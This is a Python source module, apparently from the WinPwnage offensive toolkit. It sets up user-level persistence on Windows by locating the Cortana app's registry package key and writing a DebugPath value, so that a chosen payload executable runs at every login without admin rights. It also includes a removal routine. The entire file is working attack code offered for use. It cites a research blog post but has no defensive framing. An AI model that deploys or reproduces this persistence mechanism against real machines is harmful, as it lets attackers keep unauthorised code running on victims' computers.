import _winreg
from winpwnage.core.prints import *
from winpwnage.core.utils import *

#https://oddvar.moe/2018/09/06/persistence-using-universal-windows-platform-apps-appx/

cortana_appx_info = {
	"Description": "Gain persistence using Cortana app which loads at login",
	"Id": "24",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "15063",
	"Admin": False,
	"Function Name": "persistence_cortana_appx",
	"Function Payload": True,
}

def find_cortana():
	index = 0
	cortana_version = []
	
	try:
		key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\Classes\ActivatableClasses\Package", 0, _winreg.KEY_READ)
	except Exception as error:
		print_error("Unable to open registry key, exception was raised: {}".format(error))
		return False

	try:		
		while True:
			index += 1
			if "Microsoft.Windows.Cortana_" in _winreg.EnumKey(key,index):
				cortana_version.append(_winreg.EnumKey(key,index))				
	except WindowsError as error:
		pass
		
	return cortana_version

def persistence_cortana_appx(payload, name="DebugPath", add=True):
	kpath = os.path.join("Software\Classes\ActivatableClasses\Package", find_cortana()[0], "DebugInformation\CortanaUI.AppXy7vb4pc2dr3kc93kfc509b1d0arkfb2x.mca")
	
	if add:
		if payloads().exe(payload):		
			if registry().modify_key(hkey="hkcu", path=kpath, name=name, value=os.path.join(payload), create=True):
				print_success("Successfully created {name} key containing payload ({payload})".format(name=name, payload=payload))
				print_success("Successfully installed persistence, payload will run at login")
			else:
				print_error("Unable to add persistence, exception was raised: {}".format(error))
				return False
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		if registry().remove_key(hkey="hkcu", path=kpath, name="DebugPath"):
			print_success("Successfully removed persistence")
		else:
			print_error("Unable to remove persistence")
			return False